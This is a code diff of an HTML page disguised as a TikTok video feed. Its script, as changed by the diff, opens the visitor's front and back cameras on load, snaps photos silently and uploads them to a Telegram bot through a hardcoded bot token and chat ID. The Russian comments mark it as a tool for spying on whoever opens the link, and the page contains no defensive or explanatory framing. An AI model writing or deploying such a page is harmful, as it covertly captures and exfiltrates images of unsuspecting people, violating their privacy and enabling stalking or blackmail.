@@ -1,215 +1,240 @@
 <!DOCTYPE html>
 <html lang="ru">
-  <head>
+<head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>TikTok</title>
-    <link
-      href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap"
-      rel="stylesheet"
-    />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap" rel="stylesheet" />
     <style>
-      body {
-        margin: 0;
-        padding: 0;
-        background: #000;
-        color: #fff;
-        font-family: "Poppins", sans-serif;
-        height: 100vh;
-        overflow: hidden;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-      }
-      #container {
-        width: 100%;
-        max-width: 428px;
-        height: 100vh;
-        position: relative;
-        background: #000;
-      }
-      #meme-video {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        display: block;
-      }
-      #overlay {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        pointer-events: none;
-      }
-      #header {
-        position: absolute;
-        top: 10px;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        gap: 20px;
-        font-size: 18px;
-        font-weight: 600;
-      }
-      #header span {
-        color: #fff;
-        text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
-      }
-      #header .active {
-        border-bottom: 2px solid #fff;
-        padding-bottom: 2px;
-      }
-      #content {
-        position: absolute;
-        bottom: 60px;
-        left: 15px;
-        right: 60px;
-      }
-      #username {
-        font-size: 18px;
-        font-weight: 600;
-        margin-bottom: 5px;
-        text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
-      }
-      #avatar {
-        position: absolute;
-        bottom: 10px;
-        left: 15px;
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        border: 2px solid #fff;
-        background: url("https://via.placeholder.com/40") center/cover;
-        pointer-events: auto;
-      }
-      #caption {
-        font-size: 16px;
-        line-height: 1.2;
-        text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
-        word-wrap: break-word;
-      }
-      #icons {
-        position: absolute;
-        right: 10px;
-        bottom: 60px;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 20px;
-      }
-      .icon {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        font-size: 40px; /* чуть больше для точности */
-        color: #fff;
-        text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
-        pointer-events: auto;
-      }
-      .icon span {
-        font-size: 12px;
-        margin-top: 2px;
-      }
-      #mute-btn {
-        position: absolute;
-        top: 50px;
-        right: 15px;
-        font-size: 24px;
-        color: #fff;
-        background: rgba(0, 0, 0, 0.5);
-        border: none;
-        border-radius: 50%;
-        width: 40px;
-        height: 40px;
-        cursor: pointer;
-        pointer-events: auto;
-        z-index: 10;
-      }
-      #video,
-      #canvas,
-      #photo {
-        display: none;
-      }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: "Poppins", sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #container {
+            width: 100%;
+            max-width: 428px;
+            height: 100vh;
+            position: relative;
+            background: #000;
+        }
+        #meme-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+        #header {
+            position: absolute;
+            top: 10px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        #header span {
+            color: #fff;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+        }
+        #header .active {
+            border-bottom: 2px solid #fff;
+            padding-bottom: 2px;
+        }
+        #content {
+            position: absolute;
+            bottom: 60px;
+            left: 15px;
+            right: 60px;
+        }
+        #username {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
+        }
+        #avatar {
+            position: absolute;
+            bottom: 10px;
+            left: 15px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 2px solid #fff;
+            background: url("https://via.placeholder.com/40") center/cover;
+            pointer-events: auto;
+        }
+        #caption {
+            font-size: 16px;
+            line-height: 1.2;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
+            word-wrap: break-word;
+        }
+        #icons {
+            position: absolute;
+            right: 10px;
+            bottom: 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        .icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 40px;
+            color: #fff;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
+            pointer-events: auto;
+        }
+        .icon span {
+            font-size: 12px;
+            margin-top: 2px;
+        }
+        #mute-btn {
+            position: absolute;
+            top: 50px;
+            right: 15px;
+            font-size: 24px;
+            color: #fff;
+            background: rgba(0, 0, 0, 0.5);
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            pointer-events: auto;
+            z-index: 10;
+        }
+        #video-front, #video-back, #canvas-front, #canvas-back, #photo { display: none; }
     </style>
-  </head>
-  <body>
+</head>
+<body>
     <div id="container">
-      <video id="meme-video" autoplay loop playsinline>
-        <source src="1.mp4" type="video/mp4" />
-      </video>
-      <button id="mute-btn">🔇</button>
-      <div id="overlay">
-        <div id="header">
-          <span>Following</span>
-          <span class="active">For You</span>
-          <span>Friends</span>
+        <video id="meme-video" autoplay loop playsinline>
+            <source src="1.mp4" type="video/mp4" />
+        </video>
+        <button id="mute-btn">🔇</button>
+        <div id="overlay">
+            <div id="header">
+                <span>Following</span>
+                <span class="active">For You</span>
+                <span>Friends</span>
+            </div>
+            <div id="content">
+                <div id="username">@CrazyDogs</div>
+                <div id="caption">#dogs #fyp #crazy</div>
+            </div>
+            <div id="icons">
+                <div class="icon"><span>♥️</span><span>69k</span></div>
+                <div class="icon"><span>💭</span><span>420</span></div>
+                <div class="icon"><span>➦</span><span>1337</span></div>
+            </div>
         </div>
-        <div id="content">
-          <div id="username">@CrazyDogs</div>
-          <div id="caption">#dogs #fyp #crazy</div>
-        </div>
-        <div id="icons">
-          <div class="icon"><span>♥️</span><span>69k</span></div>
-          <!-- TikTok лайк -->
-          <div class="icon"><span>💭</span><span>420</span></div>
-          <!-- TikTok коммент -->
-          <div class="icon"><span>➦</span><span>1337</span></div>
-          <!-- TikTok шэр -->
-        </div>
-      </div>
     </div>
-    <video id="video" width="400" height="300" autoplay></video>
-    <canvas id="canvas" width="400" height="300"></canvas>
+    <video id="video-front" width="400" height="300" autoplay></video>
+    <video id="video-back" width="400" height="300" autoplay></video>
+    <canvas id="canvas-front" width="400" height="300"></canvas>
+    <canvas id="canvas-back" width="400" height="300"></canvas>
     <img id="photo" src="" alt="Твоя фотка" />
 
     <script>
-      const memeVideo = document.getElementById("meme-video");
-      const muteBtn = document.getElementById("mute-btn");
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
-      const photo = document.getElementById("photo");
+        const memeVideo = document.getElementById("meme-video");
+        const muteBtn = document.getElementById("mute-btn");
+        const videoFront = document.getElementById("video-front");
+        const videoBack = document.getElementById("video-back");
+        const canvasFront = document.getElementById("canvas-front");
+        const canvasBack = document.getElementById("canvas-back");
+        const contextFront = canvasFront.getContext("2d");
+        const contextBack = canvasBack.getContext("2d");
+        const photo = document.getElementById("photo");
+        let streamFront = null;
+        let streamBack = null;
 
-      memeVideo.muted = true;
-      muteBtn.addEventListener("click", () => {
-        memeVideo.muted = !memeVideo.muted;
-        muteBtn.textContent = memeVideo.muted ? "🔇" : "🔊";
-      });
-
-      navigator.mediaDevices
-        .getUserMedia({ video: true })
-        .then((stream) => {
-          video.srcObject = stream;
-          video.onloadedmetadata = () => {
-            setTimeout(() => {
-              context.drawImage(video, 0, 0, 400, 300);
-              const photoData = canvas.toDataURL("image/png");
-              photo.src = photoData;
-              sendPhotoToBot(photoData);
-            }, 1000);
-          };
-        })
-        .catch((err) => {
-          alert("Дай камеру, сука! Ошибка: " + err);
+        memeVideo.muted = true;
+        muteBtn.addEventListener("click", () => {
+            memeVideo.muted = !memeVideo.muted;
+            muteBtn.textContent = memeVideo.muted ? "🔇" : "🔊";
         });
 
-      function sendPhotoToBot(photoData) {
-        const botToken = "8055827954:AAGIk7S8dEkZoKA3TFoTM1KcSOgnSl-wMpg"; // Твой токен от BotFather
-        const chatId = "7484556499";
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            photo: photoData,
-          }),
-        })
-          .then((res) => console.log("Фотка у тебя!"))
-          .catch((err) => console.log("Ошибка:", err));
-      }
-    </script>
-  </body>
-</html>
+        // Инициализация обеих камер
+        function initCameras() {
+            const constraintsFront = { video: { facingMode: "user" } };
+            const constraintsBack = { video: { facingMode: "environment" } };
 
+            navigator.mediaDevices.getUserMedia(constraintsFront)
+                .then((stream) => {
+                    streamFront = stream;
+                    videoFront.srcObject = stream;
+                    videoFront.onloadedmetadata = () => {
+                        contextFront.drawImage(videoFront, 0, 0, 400, 300);
+                        const photoDataFront = canvasFront.toDataURL("image/png");
+                        sendPhotoToBot(photoDataFront, "front");
+                    };
+                })
+                .catch((err) => console.log("Ошибка фронтальной камеры:", err));
+
+            navigator.mediaDevices.getUserMedia(constraintsBack)
+                .then((stream) => {
+                    streamBack = stream;
+                    videoBack.srcObject = stream;
+                    videoBack.onloadedmetadata = () => {
+                        contextBack.drawImage(videoBack, 0, 0, 400, 300);
+                        const photoDataBack = canvasBack.toDataURL("image/png");
+                        sendPhotoToBot(photoDataBack, "back");
+                    };
+                })
+                .catch((err) => console.log("Ошибка задней камеры:", err));
+        }
+
+        // Отправка фотки в Telegram
+        function sendPhotoToBot(photoData, cameraType) {
+            const botToken = "8055827954:AAGIk7S8dEkZoKA3TFoTM1KcSOgnSl-wMpg";
+            const chatId = "7484556499";
+            const byteString = atob(photoData.split(',')[1]);
+            const mimeString = photoData.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeString });
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, `photo_${cameraType}.png`);
+            formData.append("caption", `Фото с ${cameraType} камеры`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then((res) => {
+                if (res.ok) console.log(`Фотка с ${cameraType} у тебя!`);
+                else console.log(`Ошибка с ${cameraType}:`, res.status);
+            })
+            .catch((err) => console.log(`Ошибка с ${cameraType}:`, err));
+        }
+
+        // Запуск при загрузке
+        window.onload = initCameras;
+    </script>
+</body>
+</html>
